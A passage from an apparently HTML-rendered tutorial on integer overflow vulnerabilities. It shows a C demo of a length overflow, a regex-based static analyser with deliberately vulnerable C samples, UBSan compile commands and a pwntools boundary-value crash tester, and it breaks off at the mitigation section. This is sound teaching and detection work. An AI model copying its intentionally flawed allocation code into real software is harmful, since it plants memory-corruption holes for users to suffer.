<span class="s1">        printf(&quot;Length overflow detected</span><span class="se">\\</span><span class="s1">n&quot;);</span>
<span class="s1">        return;</span>
<span class="s1">    }</span>

<span class="s1">    // Allocate combined buffer</span>
<span class="s1">    unsigned char *combined = malloc(total_len);</span>
<span class="s1">    if (!combined) return;</span>

<span class="s1">    // Combine message and secret</span>
<span class="s1">    memcpy(combined, message, msg_len);</span>
<span class="s1">    memcpy(combined + msg_len, secret, secret_len);</span>

<span class="s1">    // Hash the combined data</span>
<span class="s1">    printf(&quot;Hashing </span><span class="si">%u</span><span class="s1"> bytes</span><span class="se">\\</span><span class="s1">n&quot;, total_len);</span>

<span class="s1">    free(combined);</span>
<span class="s1">}</span>
<span class="s1">&#39;&#39;&#39;</span>

    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Hash length extension overflow:&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;1. Attacker controls message length&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;2. msg_len + secret_len overflows&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;3. Small buffer allocated&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;4. Secret copied beyond buffer bounds&quot;</span><span class="p">)</span>

<span class="n">crypto_length_overflow</span><span class="p">()</span>
</code></pre></div></td></tr></table></div>
<h2 id="detection-and-analysis">Detection and Analysis</h2>
<h3 id="static-analysis-for-integer-overflows">Static Analysis for Integer Overflows</h3>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span>
<span class="normal">38</span>
<span class="normal">39</span>
<span class="normal">40</span>
<span class="normal">41</span>
<span class="normal">42</span>
<span class="normal">43</span>
<span class="normal">44</span>
<span class="normal">45</span>
<span class="normal">46</span>
<span class="normal">47</span>
<span class="normal">48</span>
<span class="normal">49</span>
<span class="normal">50</span>
<span class="normal">51</span>
<span class="normal">52</span>
<span class="normal">53</span>
<span class="normal">54</span>
<span class="normal">55</span>
<span class="normal">56</span>
<span class="normal">57</span>
<span class="normal">58</span>
<span class="normal">59</span>
<span class="normal">60</span>
<span class="normal">61</span>
<span class="normal">62</span>
<span class="normal">63</span>
<span class="normal">64</span>
<span class="normal">65</span>
<span class="normal">66</span>
<span class="normal">67</span>
<span class="normal">68</span>
<span class="normal">69</span>
<span class="normal">70</span>
<span class="normal">71</span>
<span class="normal">72</span>
<span class="normal">73</span>
<span class="normal">74</span>
<span class="normal">75</span>
<span class="normal">76</span>
<span class="normal">77</span>
<span class="normal">78</span>
<span class="normal">79</span>
<span class="normal">80</span>
<span class="normal">81</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>

<span class="k">def</span><span class="w"> </span><span class="nf">analyze_integer_overflows</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Static analysis for potential integer overflow vulnerabilities&quot;&quot;&quot;</span>

    <span class="n">issues</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">lines</span> <span class="o">=</span> <span class="n">code</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">lines</span><span class="p">,</span> <span class="mi">1</span><span class="p">):</span>
        <span class="c1"># Look for arithmetic operations with user input</span>
        <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;(\w+)\s*(\+|\*)\s*(\w+)&#39;</span><span class="p">,</span> <span class="n">line</span><span class="p">):</span>
            <span class="c1"># Check if result is used in memory operations</span>
            <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">func</span> <span class="ow">in</span> <span class="n">line</span> <span class="k">for</span> <span class="n">func</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">&#39;malloc&#39;</span><span class="p">,</span> <span class="s1">&#39;calloc&#39;</span><span class="p">,</span> <span class="s1">&#39;realloc&#39;</span><span class="p">,</span> <span class="s1">&#39;alloca&#39;</span><span class="p">]):</span>
                <span class="n">issues</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Line </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">: Potential overflow in memory allocation: </span><span class="si">{</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

            <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">func</span> <span class="ow">in</span> <span class="n">line</span> <span class="k">for</span> <span class="n">func</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">&#39;memcpy&#39;</span><span class="p">,</span> <span class="s1">&#39;memset&#39;</span><span class="p">,</span> <span class="s1">&#39;memmove&#39;</span><span class="p">]):</span>
                <span class="n">issues</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Line </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">: Potential overflow in memory operation: </span><span class="si">{</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

        <span class="c1"># Look for size calculations</span>
        <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;size\s*=.*\*&#39;</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span> <span class="ow">or</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;count\s*\*\s*sizeof&#39;</span><span class="p">,</span> <span class="n">line</span><span class="p">):</span>
            <span class="n">issues</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Line </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">: Size calculation may overflow: </span><span class="si">{</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

        <span class="c1"># Look for array indexing with calculations</span>
        <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;\[.*\+.*\]&#39;</span><span class="p">,</span> <span class="n">line</span><span class="p">):</span>
            <span class="n">issues</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Line </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">: Array index calculation may overflow: </span><span class="si">{</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

        <span class="c1"># Look for loops with user-controlled bounds</span>
        <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;for.*&lt;.*atoi&#39;</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span> <span class="ow">or</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;while.*&lt;.*user&#39;</span><span class="p">,</span> <span class="n">line</span><span class="p">):</span>
            <span class="n">issues</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Line </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">: Loop bound from user input: </span><span class="si">{</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">issues</span>

<span class="k">def</span><span class="w"> </span><span class="nf">check_type_mixing</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Check for dangerous type mixing that can lead to overflows&quot;&quot;&quot;</span>

    <span class="n">issues</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">lines</span> <span class="o">=</span> <span class="n">code</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">lines</span><span class="p">,</span> <span class="mi">1</span><span class="p">):</span>
        <span class="c1"># Look for signed/unsigned mixing</span>
        <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;unsigned.*=.*atoi&#39;</span><span class="p">,</span> <span class="n">line</span><span class="p">):</span>
            <span class="n">issues</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Line </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">: Signed to unsigned conversion: </span><span class="si">{</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;size_t.*=.*int&#39;</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span> <span class="ow">and</span> <span class="s1">&#39;unsigned&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
            <span class="n">issues</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Line </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">: Signed int to size_t conversion: </span><span class="si">{</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

        <span class="c1"># Look for casting without validation</span>
        <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;\(.*int\)&#39;</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">any</span><span class="p">(</span><span class="n">func</span> <span class="ow">in</span> <span class="n">line</span> <span class="k">for</span> <span class="n">func</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">&#39;malloc&#39;</span><span class="p">,</span> <span class="s1">&#39;sizeof&#39;</span><span class="p">]):</span>
            <span class="n">issues</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Line </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">: Unchecked type cast: </span><span class="si">{</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">issues</span>

<span class="c1"># Example usage</span>
<span class="n">vulnerable_code</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
<span class="s1">void process_data(int count, int size) {</span>
<span class="s1">    unsigned int total = count * size;  // Overflow risk</span>
<span class="s1">    char *buffer = malloc(total);       // Small allocation if overflow</span>

<span class="s1">    for (int i = 0; i &lt; count; i++) {   // Loop uses original values</span>
<span class="s1">        memset(buffer + i * size, &#39;A&#39;, size);  // Buffer overflow</span>
<span class="s1">    }</span>
<span class="s1">}</span>

<span class="s1">void copy_string(char *src) {</span>
<span class="s1">    int len = strlen(src);</span>
<span class="s1">    char *dest = malloc(len + 1);       // len + 1 can overflow</span>
<span class="s1">    strcpy(dest, src);</span>
<span class="s1">}</span>
<span class="s1">&#39;&#39;&#39;</span>

<span class="n">overflow_issues</span> <span class="o">=</span> <span class="n">analyze_integer_overflows</span><span class="p">(</span><span class="n">vulnerable_code</span><span class="p">)</span>
<span class="n">type_issues</span> <span class="o">=</span> <span class="n">check_type_mixing</span><span class="p">(</span><span class="n">vulnerable_code</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Integer overflow issues:&quot;</span><span class="p">)</span>
<span class="k">for</span> <span class="n">issue</span> <span class="ow">in</span> <span class="n">overflow_issues</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  </span><span class="si">{</span><span class="n">issue</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Type mixing issues:&quot;</span><span class="p">)</span>
<span class="k">for</span> <span class="n">issue</span> <span class="ow">in</span> <span class="n">type_issues</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  </span><span class="si">{</span><span class="n">issue</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre></div></td></tr></table></div>
<h3 id="dynamic-detection-with-sanitizers">Dynamic Detection with Sanitizers</h3>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="c1"># Compile with integer overflow detection</span>
gcc<span class="w"> </span>-fsanitize<span class="o">=</span>signed-integer-overflow<span class="w"> </span>-fsanitize<span class="o">=</span>unsigned-integer-overflow<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>-g<span class="w"> </span>-o<span class="w"> </span>overflow_test<span class="w"> </span>program.c

<span class="c1"># Run with overflow detection</span>
./overflow_test

<span class="c1"># Enable additional checks</span>
<span class="nb">export</span><span class="w"> </span><span class="nv">UBSAN_OPTIONS</span><span class="o">=</span><span class="s2">&quot;print_stacktrace=1:halt_on_error=1&quot;</span>
./overflow_test
</code></pre></div></td></tr></table></div>
<h3 id="runtime-testing">Runtime Testing</h3>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span>
<span class="normal">38</span>
<span class="normal">39</span>
<span class="normal">40</span>
<span class="normal">41</span>
<span class="normal">42</span>
<span class="normal">43</span>
<span class="normal">44</span>
<span class="normal">45</span>
<span class="normal">46</span>
<span class="normal">47</span>
<span class="normal">48</span>
<span class="normal">49</span>
<span class="normal">50</span>
<span class="normal">51</span>
<span class="normal">52</span>
<span class="normal">53</span>
<span class="normal">54</span>
<span class="normal">55</span>
<span class="normal">56</span>
<span class="normal">57</span>
<span class="normal">58</span>
<span class="normal">59</span>
<span class="normal">60</span>
<span class="normal">61</span>
<span class="normal">62</span>
<span class="normal">63</span>
<span class="normal">64</span>
<span class="normal">65</span>
<span class="normal">66</span>
<span class="normal">67</span>
<span class="normal">68</span>
<span class="normal">69</span>
<span class="normal">70</span>
<span class="normal">71</span>
<span class="normal">72</span>
<span class="normal">73</span>
<span class="normal">74</span>
<span class="normal">75</span>
<span class="normal">76</span>
<span class="normal">77</span>
<span class="normal">78</span>
<span class="normal">79</span>
<span class="normal">80</span>
<span class="normal">81</span>
<span class="normal">82</span>
<span class="normal">83</span>
<span class="normal">84</span>
<span class="normal">85</span>
<span class="normal">86</span>
<span class="normal">87</span>
<span class="normal">88</span>
<span class="normal">89</span>
<span class="normal">90</span>
<span class="normal">91</span>
<span class="normal">92</span>
<span class="normal">93</span>
<span class="normal">94</span>
<span class="normal">95</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">struct</span>

<span class="k">def</span><span class="w"> </span><span class="nf">test_integer_boundaries</span><span class="p">(</span><span class="n">binary_path</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Test various integer boundary conditions&quot;&quot;&quot;</span>

    <span class="n">test_cases</span> <span class="o">=</span> <span class="p">[</span>
        <span class="c1"># Unsigned integer boundaries</span>
        <span class="p">(</span><span class="s2">&quot;0&quot;</span><span class="p">,</span> <span class="s2">&quot;Zero&quot;</span><span class="p">),</span>
        <span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">,</span> <span class="s2">&quot;One&quot;</span><span class="p">),</span>
        <span class="p">(</span><span class="s2">&quot;4294967295&quot;</span><span class="p">,</span> <span class="s2">&quot;UINT_MAX (32-bit)&quot;</span><span class="p">),</span>
        <span class="p">(</span><span class="s2">&quot;4294967296&quot;</span><span class="p">,</span> <span class="s2">&quot;UINT_MAX + 1&quot;</span><span class="p">),</span>
        <span class="p">(</span><span class="s2">&quot;18446744073709551615&quot;</span><span class="p">,</span> <span class="s2">&quot;ULLONG_MAX (64-bit)&quot;</span><span class="p">),</span>

        <span class="c1"># Signed integer boundaries</span>
        <span class="p">(</span><span class="s2">&quot;2147483647&quot;</span><span class="p">,</span> <span class="s2">&quot;INT_MAX (32-bit)&quot;</span><span class="p">),</span>
        <span class="p">(</span><span class="s2">&quot;2147483648&quot;</span><span class="p">,</span> <span class="s2">&quot;INT_MAX + 1&quot;</span><span class="p">),</span>
        <span class="p">(</span><span class="s2">&quot;-2147483648&quot;</span><span class="p">,</span> <span class="s2">&quot;INT_MIN (32-bit)&quot;</span><span class="p">),</span>
        <span class="p">(</span><span class="s2">&quot;-2147483649&quot;</span><span class="p">,</span> <span class="s2">&quot;INT_MIN - 1&quot;</span><span class="p">),</span>

        <span class="c1"># Overflow-inducing pairs</span>
        <span class="p">(</span><span class="s2">&quot;4294967295&quot;</span><span class="p">,</span> <span class="s2">&quot;UINT_MAX for size calculations&quot;</span><span class="p">),</span>
        <span class="p">(</span><span class="s2">&quot;65536&quot;</span><span class="p">,</span> <span class="s2">&quot;Large value for width/height&quot;</span><span class="p">),</span>
        <span class="p">(</span><span class="s2">&quot;0xffffffff&quot;</span><span class="p">,</span> <span class="s2">&quot;Hex UINT_MAX&quot;</span><span class="p">),</span>
    <span class="p">]</span>

    <span class="n">results</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="k">for</span> <span class="n">test_input</span><span class="p">,</span> <span class="n">description</span> <span class="ow">in</span> <span class="n">test_cases</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">binary_path</span><span class="p">,</span> <span class="n">test_input</span><span class="p">])</span>
            <span class="n">output</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>

            <span class="n">result</span> <span class="o">=</span> <span class="p">{</span>
                <span class="s1">&#39;input&#39;</span><span class="p">:</span> <span class="n">test_input</span><span class="p">,</span>
                <span class="s1">&#39;description&#39;</span><span class="p">:</span> <span class="n">description</span><span class="p">,</span>
                <span class="s1">&#39;output&#39;</span><span class="p">:</span> <span class="n">output</span><span class="p">,</span>
                <span class="s1">&#39;crashed&#39;</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">returncode</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">,</span>
                <span class="s1">&#39;returncode&#39;</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">returncode</span>
            <span class="p">}</span>

            <span class="n">results</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="n">results</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
                <span class="s1">&#39;input&#39;</span><span class="p">:</span> <span class="n">test_input</span><span class="p">,</span>
                <span class="s1">&#39;description&#39;</span><span class="p">:</span> <span class="n">description</span><span class="p">,</span>
                <span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">),</span>
                <span class="s1">&#39;crashed&#39;</span><span class="p">:</span> <span class="kc">True</span>
            <span class="p">})</span>

    <span class="k">return</span> <span class="n">results</span>

<span class="k">def</span><span class="w"> </span><span class="nf">fuzz_arithmetic_operations</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Fuzz arithmetic operations for overflows&quot;&quot;&quot;</span>

    <span class="kn">import</span><span class="w"> </span><span class="nn">random</span>

    <span class="c1"># Generate test values around boundaries</span>
    <span class="n">test_values</span> <span class="o">=</span> <span class="p">[</span>
        <span class="c1"># Near 32-bit boundaries</span>
        <span class="mh">0xfffffffe</span><span class="p">,</span> <span class="mh">0xffffffff</span><span class="p">,</span> <span class="mh">0x80000000</span><span class="p">,</span> <span class="mh">0x7fffffff</span><span class="p">,</span>
        <span class="c1"># Near 16-bit boundaries  </span>
        <span class="mh">0xfffe</span><span class="p">,</span> <span class="mh">0xffff</span><span class="p">,</span> <span class="mh">0x8000</span><span class="p">,</span> <span class="mh">0x7fff</span><span class="p">,</span>
        <span class="c1"># Powers of 2</span>
        <span class="mi">2</span><span class="o">**</span><span class="mi">8</span><span class="p">,</span> <span class="mi">2</span><span class="o">**</span><span class="mi">16</span><span class="p">,</span> <span class="mi">2</span><span class="o">**</span><span class="mi">24</span><span class="p">,</span> <span class="mi">2</span><span class="o">**</span><span class="mi">32</span><span class="p">,</span>
        <span class="c1"># Random large values</span>
        <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mh">0xf0000000</span><span class="p">,</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
    <span class="p">]</span>

    <span class="n">overflow_cases</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="k">for</span> <span class="n">val1</span> <span class="ow">in</span> <span class="n">test_values</span><span class="p">[:</span><span class="mi">10</span><span class="p">]:</span>  <span class="c1"># Limit combinations</span>
        <span class="k">for</span> <span class="n">val2</span> <span class="ow">in</span> <span class="n">test_values</span><span class="p">[:</span><span class="mi">10</span><span class="p">]:</span>
            <span class="c1"># Test addition overflow</span>
            <span class="n">add_result</span> <span class="o">=</span> <span class="p">(</span><span class="n">val1</span> <span class="o">+</span> <span class="n">val2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
            <span class="k">if</span> <span class="n">add_result</span> <span class="o">&lt;</span> <span class="n">val1</span> <span class="ow">or</span> <span class="n">add_result</span> <span class="o">&lt;</span> <span class="n">val2</span><span class="p">:</span>
                <span class="n">overflow_cases</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="s1">&#39;add&#39;</span><span class="p">,</span> <span class="n">val1</span><span class="p">,</span> <span class="n">val2</span><span class="p">,</span> <span class="n">add_result</span><span class="p">))</span>

            <span class="c1"># Test multiplication overflow</span>
            <span class="n">mul_result</span> <span class="o">=</span> <span class="p">(</span><span class="n">val1</span> <span class="o">*</span> <span class="n">val2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
            <span class="k">if</span> <span class="n">val2</span> <span class="o">!=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">mul_result</span> <span class="o">//</span> <span class="n">val2</span> <span class="o">!=</span> <span class="n">val1</span><span class="p">:</span>
                <span class="n">overflow_cases</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="s1">&#39;mul&#39;</span><span class="p">,</span> <span class="n">val1</span><span class="p">,</span> <span class="n">val2</span><span class="p">,</span> <span class="n">mul_result</span><span class="p">))</span>

    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Found </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">overflow_cases</span><span class="p">)</span><span class="si">}</span><span class="s2"> overflow cases&quot;</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">op</span><span class="p">,</span> <span class="n">val1</span><span class="p">,</span> <span class="n">val2</span><span class="p">,</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">overflow_cases</span><span class="p">[:</span><span class="mi">5</span><span class="p">]:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">op</span><span class="si">}</span><span class="s2">: 0x</span><span class="si">{</span><span class="n">val1</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">op</span><span class="si">}</span><span class="s2"> 0x</span><span class="si">{</span><span class="n">val2</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2"> = 0x</span><span class="si">{</span><span class="n">result</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">overflow_cases</span>

<span class="c1"># Example usage</span>
<span class="c1"># results = test_integer_boundaries(&#39;./vuln_overflow&#39;)</span>
<span class="c1"># overflow_cases = fuzz_arithmetic_operations()</span>
</code></pre></div></td></tr></table></div>
<h2 id="mitigation-and-prevention">Mitigation and Prevention</h2>
<h3 id="safe-integer-arithmetic">Safe Integer Arithmetic</h3>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span>
<span class="normal">38</span>
<span class="normal">39</span>
<span class="normal">40</span>
<span class="normal">41</span>
<span class="normal">42</span>
<span class="normal">43</span>
<span class="normal">44</span>
<span class="normal">45</span>
<span class="normal">46</span>
<span class="normal">47</span>
<span class="normal">48</span>
<span class="normal">49</span>
<span class="normal">50</span>
<span class="normal">51</span>
<span class="normal">52</span>
<span class="normal">53</span>
<span class="normal">54</span>
<span class="normal">55</span>
<span class="normal">56</span>
<span class="normal">57</span>
<span class="normal">58</span>
<span class="normal">59</span>
<span class="normal">60</span>
<span class="normal">61</span>
<span class="normal">62</span>
<span class="normal">63</span>
<span class="normal">64</span>
<span class="normal">65</span>
<span class="normal">66</span>
<span class="normal">67</span>
<span class="normal">68</span>
<span class="normal">69</span>
<span class="normal">70</span>
<span class="normal">71</span>
<span class="normal">72</span>
<span class="normal">73</span>
<span class="normal">74</span>
<span class="normal">75</span>
<span class="normal">76</span>
<span class="normal">77</span>
<span class="normal">78</span>
<span class="normal">79</span>
<span class="normal">80</span>
<span class="normal">81</span>
<span class="normal">82</span>
<span class="normal">83</span>
<span class="normal">84</span>
<span class="normal">85</span>
<span class="normal">86</span>
<span class="normal">87</span>
<span class="normal">88</span>
<span class="normal">89</span>
